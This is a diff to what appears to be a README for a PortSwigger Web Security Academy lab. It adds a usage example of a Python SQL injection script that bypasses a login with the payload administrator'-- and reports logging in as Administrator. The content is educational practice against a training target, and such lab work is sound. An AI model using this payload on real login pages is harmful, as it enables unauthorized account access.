@@ -26,3 +26,14 @@ $ python3 sqli_lab_02.py https://ac391f171f7c8b61c0fa3ec000630052.web-security-a
 [✓] Csrf Token: 3hPVIbOtx90JjKDpS8owRdk34kFD9BFR
 [✓] SQL Injection successful!. We have logged as an Administrator!
 ```
+
+```bash
+$ python3 sqli_lab_02_version_2.py -u https://0acb002d036ed07b80dd267c002500d1.web-security-academy.net/login "administrator'--" -p "http://127.0.0.1:8080"
+
+    >> SQL injection vulnerability allowing login bypass
+    >> by Port Swigger Academy
+
+[*] Using proxy: http://127.0.0.1:8080
+[✓] Csrf Token: cUNaFfBRxkoJFjLoAyXvGmVexbQfr2Ha
+[✓] SQL Injection successful!. We have logged as an Administrator!
+```
